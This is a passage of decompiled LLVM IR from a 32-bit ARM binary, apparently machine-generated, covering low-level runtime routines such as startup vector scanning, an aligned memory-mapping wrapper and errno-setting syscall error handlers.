  store i32 %v4_14d0c, i32* %r4.global-to-local, align 4
  %v2_14d14 = add i32 %v1_14ce8, %v3_14cf8
  store i32 %v2_14d14, i32* %ip.global-to-local, align 4
  %v9_14d18 = icmp eq i32 %v2_14d14, %v2_14cec
  store i1 %v9_14d18, i1* %cpsr_z.global-to-local, align 1
  %v2_14d1c = inttoptr i32 %v4_14d00 to i32*
  store i32 %arg7, i32* %v2_14d1c, align 4
  store i32 25512, i32* %r2.global-to-local, align 4
  %v0_14d28 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_14d18, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_14ce0
  %v1_14d2c = load i32, i32* @r7, align 4
  %v2_14d2c = load i32, i32* %r5.global-to-local, align 4
  %v3_14d2c = add i32 %v2_14d2c, %v1_14d2c
  store i32 %v3_14d2c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_29760.379, align 4
  %v0_14d34 = load i32, i32* %ip.global-to-local, align 4
  %v1_14d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_14d34 = inttoptr i32 %v1_14d34 to i32*
  store i32 %v0_14d34, i32* %v2_14d34, align 4
  store i32 120, i32* @r2, align 4
  %v1_14d40 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d40 = load i32, i32* %r4.global-to-local, align 4
  %v3_14d40 = inttoptr i32 %v2_14d40 to i32*
  store i32 %v1_14d40, i32* %v3_14d40, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_14ce0
  store i32 %arg6, i32* @global_var_29760.379, align 4
  %v0_14d34.c = load i32, i32* %ip.global-to-local, align 4
  %v1_14d34.c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d34.c = inttoptr i32 %v1_14d34.c to i32*
  store i32 %v0_14d34.c, i32* %v2_14d34.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  %v2_14d4c = bitcast i32* %stack_var_-120 to i8*
  %v3_14d4c = call i32 @function_11f30(i8* %v2_14d4c, i32 0)
  %v0_14d50 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d50 = inttoptr i32 %v0_14d50 to i32*
  %storemerge.pre = load i32, i32* %v1_14d50, align 4
  br label %dec_label_pc_14d5c

dec_label_pc_14d5c:                               ; preds = %dec_label_pc_14d5c, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_14d5c, %dec_label_pc_14d5c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14d5c = inttoptr i32 %storemerge to i32*
  %v2_14d5c = load i32, i32* %v1_14d5c, align 4
  store i32 %v2_14d5c, i32* %r3.global-to-local, align 4
  %v4_14d5c = add i32 %storemerge, 4
  store i32 %v4_14d5c, i32* %r2.global-to-local, align 4
  %v2_14d60 = icmp eq i32 %v2_14d5c, 0
  br i1 %v2_14d60, label %dec_label_pc_14d6c, label %dec_label_pc_14d5c

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14d5c
  store i32 %v4_14d5c, i32* @r4, align 4
  store i32 %v2_14d08, i32* @r5, align 4
  %v1_14d9029 = inttoptr i32 %v4_14d5c to i32*
  %v2_14d9030 = load i32, i32* %v1_14d9029, align 4
  store i32 %v2_14d9030, i32* %r3.global-to-local, align 4
  %v2_14d9432 = icmp eq i32 %v2_14d9030, 0
  store i1 %v2_14d9432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d9432, label %dec_label_pc_14d9c, label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d6c, %dec_label_pc_14d90
  %v5_14d7c = phi i32 [ %v2_14d90, %dec_label_pc_14d90 ], [ %v2_14d9030, %dec_label_pc_14d6c ]
  %v2_14d78 = icmp ugt i32 %v5_14d7c, 13
  %v7_14d78 = icmp eq i32 %v5_14d7c, 14
  store i1 %v7_14d78, i1* %cpsr_z.global-to-local, align 1
  %v2_14d7c = xor i1 %v2_14d78, true
  %v3_14d7c = or i1 %v7_14d78, %v2_14d7c
  br i1 %v3_14d7c, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_14d78
  %v6_14d7c = and i32 %v5_14d7c, 536870912
  %v7_14d7c = icmp ne i32 %v6_14d7c, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_14d78, %bb58
  %v1_14d88 = phi i1 [ %v2_14d78, %dec_label_pc_14d78 ], [ %v7_14d7c, %bb58 ]
  %v2_14d80 = xor i1 %v1_14d88, true
  %v3_14d80 = or i1 %v7_14d78, %v2_14d80
  br i1 %v3_14d80, label %bb60, label %dec_label_pc_14d90

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d90

dec_label_pc_14d90:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_14d80, i32 ptrtoint (i32* @global_var_12050.393 to i32))
  %v0_14d8c = load i32, i32* @r4, align 4
  %v1_14d8c = add i32 %v0_14d8c, 8
  store i32 %v1_14d8c, i32* @r4, align 4
  %v1_14d90 = inttoptr i32 %v1_14d8c to i32*
  %v2_14d90 = load i32, i32* %v1_14d90, align 4
  store i32 %v2_14d90, i32* %r3.global-to-local, align 4
  %v2_14d94 = icmp eq i32 %v2_14d90, 0
  store i1 %v2_14d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d94, label %dec_label_pc_14d9c, label %dec_label_pc_14d78

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d90, %dec_label_pc_14d6c
  %v1_14da0 = call i32 @function_18418(i32 %v2_14d08)
  store i32 %v1_14da0, i32* @r0, align 4
  %v1_14da4 = call i32 @function_14c74(i32 %v1_14da0)
  store i32 %v1_14da4, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_14db0 = load i32, i32* @r6, align 4
  %v2_14db0 = add i32 %v0_14db0, 96
  %v3_14db0 = inttoptr i32 %v2_14db0 to i32*
  %v4_14db0 = load i32, i32* %v3_14db0, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_14db8 = icmp eq i32 %tmp53, 0
  store i1 %v2_14db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14db8, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_14d9c
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_14d9c, %bb61
  %v0_14dc4 = phi i32 [ %tmp53, %dec_label_pc_14d9c ], [ 4096, %bb61 ]
  %v3_14dc0 = icmp eq i32 %tmp52, -1
  %v8_14dc0 = icmp eq i32 %tmp52, -1
  store i1 %v8_14dc0, i1* %cpsr_z.global-to-local, align 1
  %v2_14dc4 = inttoptr i32 %v4_14db0 to i32*
  store i32 %v0_14dc4, i32* %v2_14dc4, align 4
  br i1 %v3_14dc0, label %dec_label_pc_14dcc, label %dec_label_pc_14df4

dec_label_pc_14dcc:                               ; preds = %bb62
  %v0_14dcc = call i32 @function_1516c()
  store i32 %v0_14dcc, i32* @r0, align 4
  store i32 %v0_14dcc, i32* @r4, align 4
  %v0_14dd4 = call i32 @function_151fc()
  store i32 %v0_14dd4, i32* @r0, align 4
  %v0_14dd8 = load i32, i32* @r4, align 4
  %v9_14dd8 = icmp eq i32 %v0_14dd8, %v0_14dd4
  store i1 %v9_14dd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14dd8, label %dec_label_pc_14de0, label %dec_label_pc_14e1c

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14dcc
  %v1_14de0 = call i32 @function_1527c(i32 %v0_14dd4)
  store i32 %v1_14de0, i32* @r0, align 4
  store i32 %v1_14de0, i32* @r4, align 4
  %v0_14de8 = call i32 @function_151e8()
  store i32 %v0_14de8, i32* @r0, align 4
  %v0_14dec = load i32, i32* @r4, align 4
  %v9_14dec = icmp eq i32 %v0_14dec, %v0_14de8
  store i1 %v9_14dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14dec, label %dec_label_pc_14df4, label %dec_label_pc_14e1c

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14de0, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_14dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14dc0, label %dec_label_pc_14e40, label %dec_label_pc_14e00

dec_label_pc_14e00:                               ; preds = %dec_label_pc_14df4
  store i32 %tmp51, i32* @r3, align 4
  %v9_14e04 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_14e04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e04, label %dec_label_pc_14e0c, label %dec_label_pc_14e1c

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14e00
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_14e14 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_14e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e14, label %dec_label_pc_14e40, label %dec_label_pc_14e1c

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e00, %dec_label_pc_14de0, %dec_label_pc_14dcc, %dec_label_pc_14e0c
  %v2_14e24 = call i32 @function_14c20(i32 0, i32 32768)
  %v2_14e30 = call i32 @function_14c20(i32 1, i32 32770)
  %v2_14e3c = call i32 @function_14c20(i32 2, i32 32770)
  store i32 %v2_14e3c, i32* @r0, align 4
  br label %dec_label_pc_14e40

dec_label_pc_14e40:                               ; preds = %dec_label_pc_14e0c, %dec_label_pc_14df4, %dec_label_pc_14e1c
  %v0_14e40 = load i32, i32* @r7, align 4
  %v1_14e40 = inttoptr i32 %v0_14e40 to i32*
  %v2_14e40 = load i32, i32* %v1_14e40, align 4
  store i32 %v2_14e40, i32* %r2.global-to-local, align 4
  store i32 792, i32* %r3.global-to-local, align 4
  %v1_14e48 = load i32, i32* @r6, align 4
  %v3_14e48 = add i32 %v1_14e48, 792
  %v4_14e48 = inttoptr i32 %v3_14e48 to i32*
  store i32 %v2_14e40, i32* %v4_14e48, align 4
  %v0_14e4c = load i32, i32* @r7, align 4
  %v1_14e4c = inttoptr i32 %v0_14e4c to i32*
  %v2_14e4c = load i32, i32* %v1_14e4c, align 4
  store i32 %v2_14e4c, i32* @r4, align 4
  %v2_14e50 = icmp eq i32 %v2_14e4c, 0
  store i1 %v2_14e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e50, label %dec_label_pc_14ef4.lr.ph, label %dec_label_pc_14e58

dec_label_pc_14e58:                               ; preds = %dec_label_pc_14e40
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_14e5c = load i32, i32* @r6, align 4
  %v2_14e5c = add i32 %v0_14e5c, 116
  %v3_14e5c = inttoptr i32 %v2_14e5c to i32*
  %v4_14e5c = load i32, i32* %v3_14e5c, align 4
  store i32 %v4_14e5c, i32* %r3.global-to-local, align 4
  %v2_14e60 = inttoptr i32 %v4_14e5c to i32*
  store i32 %v2_14e4c, i32* %v2_14e60, align 4
  %v0_14e68 = load i32, i32* @r7, align 4
  %v1_14e68 = inttoptr i32 %v0_14e68 to i32*
  %v2_14e68 = load i32, i32* %v1_14e68, align 4
  %v4_14e6c = call i32 @function_17c98(i32 %v2_14e68, i32 47, i32 %v2_14e40, i32 %v4_14e5c)
  store i32 %v4_14e6c, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_14e74 = icmp eq i32 %v4_14e6c, 0
  store i1 %v2_14e74, i1* %cpsr_z.global-to-local, align 1
  %v0_14e78 = load i32, i32* @r6, align 4
  %v2_14e78 = add i32 %v0_14e78, 64
  %v3_14e78 = inttoptr i32 %v2_14e78 to i32*
  %v4_14e78 = load i32, i32* %v3_14e78, align 4
  store i32 %v4_14e78, i32* %r2.global-to-local, align 4
  br i1 %v2_14e74, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_14e58
  %v2_14e8047 = inttoptr i32 %v4_14e78 to i32*
  store i32 0, i32* %v2_14e8047, align 4
  br label %dec_label_pc_14ef4.lr.ph

bb63:                                             ; preds = %dec_label_pc_14e58
  %v2_14e7c = add i32 %v4_14e6c, 1
  store i32 %v2_14e7c, i32* %r3.global-to-local, align 4
  %v2_14e80 = inttoptr i32 %v4_14e78 to i32*
  store i32 %v4_14e6c, i32* %v2_14e80, align 4
  %v1_14e84 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e84 = load i32, i32* %r2.global-to-local, align 4
  %v3_14e84 = inttoptr i32 %v2_14e84 to i32*
  store i32 %v1_14e84, i32* %v3_14e84, align 4
  br label %dec_label_pc_14ef4.lr.ph

dec_label_pc_14ef4.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_14e40
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_14e9c = load i32, i32* @r6, align 4
  %v2_14e9c = add i32 %v0_14e9c, -12
  store i32 %v2_14e9c, i32* %r8.global-to-local, align 4
  store i32 25508, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_2975c.377, align 4
  %v2_14ecc = icmp eq i32 %v0_14d28, 0
  store i1 %v2_14ecc, i1* %cpsr_z.global-to-local, align 1
  store i32 85720, i32* %lr.global-to-local, align 4
  %v2_14ed4 = xor i1 %v2_14ecc, true
  call void @__pseudo_cond_branch(i1 %v2_14ed4, i32 %v0_14d28)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_14ee8 = load i32, i32* @r6, align 4
  %v2_14ee8 = add i32 %v0_14ee8, -12
  store i32 %v2_14ee8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14ef4.dec_label_pc_14ef4_crit_edge, %dec_label_pc_14ef4.lr.ph
  %v1_14ef4 = phi i32 [ %v1_14f00, %dec_label_pc_14ef4.dec_label_pc_14ef4_crit_edge ], [ 0, %dec_label_pc_14ef4.lr.ph ]
  %v0_14ef4 = phi i32 [ %v0_14ef4.pre, %dec_label_pc_14ef4.dec_label_pc_14ef4_crit_edge ], [ %v2_14ee8, %dec_label_pc_14ef4.lr.ph ]
  %v4_14ef4 = mul i32 %v1_14ef4, 4
  %v5_14ef4 = add i32 %v4_14ef4, %v0_14ef4
  %v6_14ef4 = inttoptr i32 %v5_14ef4 to i32*
  %v7_14ef4 = load i32, i32* %v6_14ef4, align 4
  store i32 %v7_14ef4, i32* %ip.global-to-local, align 4
  store i32 85760, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14ef4)
  %v0_14f00 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f00 = add i32 %v0_14f00, 1
  store i32 %v1_14f00, i32* %r4.global-to-local, align 4
  %v1_14f04 = load i32, i32* %r5.global-to-local, align 4
  %v3_14f04 = icmp ult i32 %v1_14f00, %v1_14f04
  %v9_14f04 = icmp eq i32 %v1_14f00, %v1_14f04
  store i1 %v9_14f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14f04, label %dec_label_pc_14ef4.dec_label_pc_14ef4_crit_edge, label %dec_label_pc_14f0c

dec_label_pc_14ef4.dec_label_pc_14ef4_crit_edge:  ; preds = %dec_label_pc_14ef4
  %v0_14ef4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14ef4

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14ef4
  %v0_14f10.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14f10 = add i32 %v0_14f10.pre, 108
  %v3_14f10 = inttoptr i32 %v2_14f10 to i32*
  %v4_14f10 = load i32, i32* %v3_14f10, align 4
  store i32 %v4_14f10, i32* %r2.global-to-local, align 4
  store i32 %v4_14f10, i32* %r3.global-to-local, align 4
  %v2_14f18 = icmp eq i32 %v4_14f10, 0
  store i1 %v2_14f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f18, label %dec_label_pc_14f30, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14f0c
  store i32 85800, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f10)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14f2c = load i32, i32* @r0, align 4
  %v2_14f2c = inttoptr i32 %v1_14f2c to i32*
  store i32 0, i32* %v2_14f2c, align 4
  %v0_14f34.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14f30

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14f0c, %dec_label_pc_14f20
  %v0_14f34 = phi i32 [ %v0_14f10.pre, %dec_label_pc_14f0c ], [ %v0_14f34.pre, %dec_label_pc_14f20 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_14f34 = add i32 %v0_14f34, 84
  %v3_14f34 = inttoptr i32 %v2_14f34 to i32*
  %v4_14f34 = load i32, i32* %v3_14f34, align 4
  store i32 %v4_14f34, i32* %r2.global-to-local, align 4
  store i32 %v4_14f34, i32* %r3.global-to-local, align 4
  %v2_14f3c = icmp eq i32 %v4_14f34, 0
  store i1 %v2_14f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f3c, label %dec_label_pc_14f54, label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f30
  store i32 85836, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f34)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14f50 = load i32, i32* @r0, align 4
  %v2_14f50 = inttoptr i32 %v1_14f50 to i32*
  store i32 0, i32* %v2_14f50, align 4
  %v0_14f58.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14f54

dec_label_pc_14f54:                               ; preds = %dec_label_pc_14f30, %dec_label_pc_14f44
  %v0_14f58 = phi i32 [ %v0_14f34, %dec_label_pc_14f30 ], [ %v0_14f58.pre, %dec_label_pc_14f44 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v2_14f58 = add i32 %v0_14f58, 32
  %v3_14f58 = inttoptr i32 %v2_14f58 to i32*
  %v4_14f58 = load i32, i32* %v3_14f58, align 4
  store i32 %v4_14f58, i32* %r3.global-to-local, align 4
  %v1_14f60 = inttoptr i32 %v4_14f58 to i32*
  %v2_14f60 = load i32, i32* %v1_14f60, align 4
  store i32 %v2_14f60, i32* %r2.global-to-local, align 4
  %v0_14f64 = load i32, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_14f70.406 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_14f70 = call i32 @function_1422c(i32 %v0_14f64)
  %v0_14f74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f74, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_14f54
  %v1_14f74 = load i32, i32* %lr.global-to-local, align 4
  %v2_14f74 = trunc i32 %v1_14f74 to i16
  %v4_14f74 = inttoptr i32 %v1_14f70 to i16*
  store i16 %v2_14f74, i16* %v4_14f74, align 2
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14f54, %bb64
  %v4_14f94 = phi i32 [ %v1_14f70, %dec_label_pc_14f54 ], [ 0, %bb64 ]
  ret i32 %v4_14f94

; uselistorder directives
  uselistorder i32 %v0_14f10.pre, { 1, 0 }
  uselistorder i32 %v1_14f04, { 1, 0 }
  uselistorder i32 %v1_14f00, { 3, 2, 1, 0 }
  uselistorder i32 %v4_14e78, { 1, 0, 2 }
  uselistorder i1 %v8_14dc0, { 1, 2, 0 }
  uselistorder i32 %v2_14d90, { 1, 2, 0 }
  uselistorder i1 %v2_14d78, { 1, 0 }
  uselistorder i32 %v4_14d5c, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_14d28, { 1, 0 }
  uselistorder i32 %v3_14cf8, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 0, 1, 5, 4, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 0, 12, 13, 14, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 7, 0, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_1422c, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_14c20, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14f54, { 1, 0 }
  uselistorder label %dec_label_pc_14f30, { 1, 0 }
  uselistorder label %dec_label_pc_14ef4.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14e40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e1c, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_14d90, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_14d78, { 1, 0 }
}

define i32 @function_14fb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_14fb4:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14fb4 = load i32, i32* @r4, align 4
  store i32 %v3_14fb4, i32* %stack_var_-16, align 4
  %v3_14fc0 = urem i32 %arg3, 4096
  %v2_14fc4 = icmp eq i32 %v3_14fc0, 0
  br i1 %v2_14fc4, label %dec_label_pc_14fe0, label %dec_label_pc_14fcc

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14fb4
  %v0_14fcc = call i32 @function_1095c()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14fd8 = inttoptr i32 %v0_14fcc to i32*
  store i32 22, i32* %v2_14fd8, align 4
  %v0_15010.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15010

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fb4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1500c, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14fe0
  %v0_14ffc = call i32 @function_1095c()
  %v0_15000 = load i32, i32* %r4.global-to-local, align 4
  %v1_15000 = sub i32 0, %v0_15000
  %v2_15004 = inttoptr i32 %v0_14ffc to i32*
  store i32 %v1_15000, i32* %v2_15004, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1500c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14fe0, %dec_label_pc_14ffc
  %v0_1500c = phi i32 [ %arg1, %dec_label_pc_14fe0 ], [ -1, %dec_label_pc_14ffc ]
  store i32 %v0_1500c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15010

dec_label_pc_15010:                               ; preds = %dec_label_pc_14fcc, %dec_label_pc_1500c
  %v0_15010 = phi i32 [ %v0_15010.pre, %dec_label_pc_14fcc ], [ %v0_1500c, %dec_label_pc_1500c ]
  %v2_15014 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15014, i32* @r4, align 4
  ret i32 %v0_15010

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15010, { 1, 0 }
  uselistorder label %dec_label_pc_1500c, { 1, 0 }
}

define i32 @function_1501c() local_unnamed_addr {
dec_label_pc_1501c:
  %stack_var_-8 = alloca i32, align 4
  %v3_1501c = load i32, i32* @r4, align 4
  store i32 %v3_1501c, i32* %stack_var_-8, align 4
  %v0_15020 = load i32, i32* @r0, align 4
  %v0_15024 = call i32 @function_1095c()
  %v1_15028 = sub i32 0, %v0_15020
  %v2_1502c = inttoptr i32 %v0_15024 to i32*
  store i32 %v1_15028, i32* %v2_1502c, align 4
  %v2_15034 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15034, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_1503c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1503c:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1503c = load i32, i32* @r4, align 4
  %v6_1503c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_15044 = icmp eq i32 %arg2, 0
  store i32 144312, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_15044, label %dec_label_pc_15098, label %dec_label_pc_1505c

dec_label_pc_1505c:                               ; preds = %dec_label_pc_1503c
  %v1_1505c = add i32 %arg2, 4
  %v2_1505c = inttoptr i32 %v1_1505c to i32*
  %v3_1505c = load i32, i32* %v2_1505c, align 4
  store i32 %v3_1505c, i32* @r3, align 4
  %v1_15060 = and i32 %v3_1505c, 67108864
  %v2_15060 = icmp eq i32 %v1_15060, 0
  br i1 %v2_15060, label %dec_label_pc_15068, label %dec_label_pc_15098

dec_label_pc_15068:                               ; preds = %dec_label_pc_1505c
  store i32 20, i32* @r2, align 4
  %v2_1506c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1506c, i32* @r0, align 4
  %v0_15070 = call i32 @function_12050()
  %v0_15098.pre = load i32, i32* @r5, align 4
  %v0_150a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_1505c, %dec_label_pc_1503c, %dec_label_pc_15068
  %v0_150a0 = phi i32 [ %arg3, %dec_label_pc_1505c ], [ %arg3, %dec_label_pc_1503c ], [ %v0_150a0.pre, %dec_label_pc_15068 ]
  %v0_1509c = phi i32 [ %arg2, %dec_label_pc_1505c ], [ 0, %dec_label_pc_1503c ], [ %v2_1506c, %dec_label_pc_15068 ]
  %v0_15098 = phi i32 [ %arg1, %dec_label_pc_1505c ], [ %arg1, %dec_label_pc_1503c ], [ %v0_15098.pre, %dec_label_pc_15068 ]
  %v4_150a8 = call i32 @function_152f8(i32 %v0_15098, i32 %v0_1509c, i32 %v0_150a0, i32 8)
  store i32 %v3_1503c, i32* @r4, align 4
  store i32 %v6_1503c, i32* @r5, align 4
  ret i32 %v4_150a8

; uselistorder directives
  uselistorder i32 67108864, { 1, 0 }
  uselistorder label %dec_label_pc_15098, { 2, 0, 1 }
}

define i32 @function_150bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_150bc:
  %v0_150bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_150bc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_150bc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_150bc, %bb
  %v0_150d0 = phi i32 [ %arg1, %dec_label_pc_150bc ], [ 0, %bb ]
  ret i32 %v0_150d0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_150dc() local_unnamed_addr {
dec_label_pc_150dc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_150dc = load i32, i32* @r7, align 4
  store i32 %v3_150dc, i32* %stack_var_-8, align 4
  %v0_150e8 = load i32, i32* @r0, align 4
  store i32 %v0_150e8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_150e8, -4095
  br i1 %tmp, label %dec_label_pc_15104, label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150dc
  %v0_150f4 = call i32 @function_1095c()
  %v0_150f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_150f8 = sub i32 0, %v0_150f8
  %v2_150fc = inttoptr i32 %v0_150f4 to i32*
  store i32 %v1_150f8, i32* %v2_150fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15108.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15104

dec_label_pc_15104:                               ; preds = %dec_label_pc_150dc, %dec_label_pc_150f4
  %v2_15108 = phi i32 [ %v3_150dc, %dec_label_pc_150dc ], [ %v2_15108.pre, %dec_label_pc_150f4 ]
  %v0_15104 = phi i32 [ %v0_150e8, %dec_label_pc_150dc ], [ -1, %dec_label_pc_150f4 ]
  store i32 %v2_15108, i32* @r7, align 4
  ret i32 %v0_15104

; uselistorder directives
  uselistorder i32 %v0_150e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15104, { 1, 0 }
}

define i32 @function_15110() local_unnamed_addr {
dec_label_pc_15110:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15110 = load i32, i32* @r7, align 4
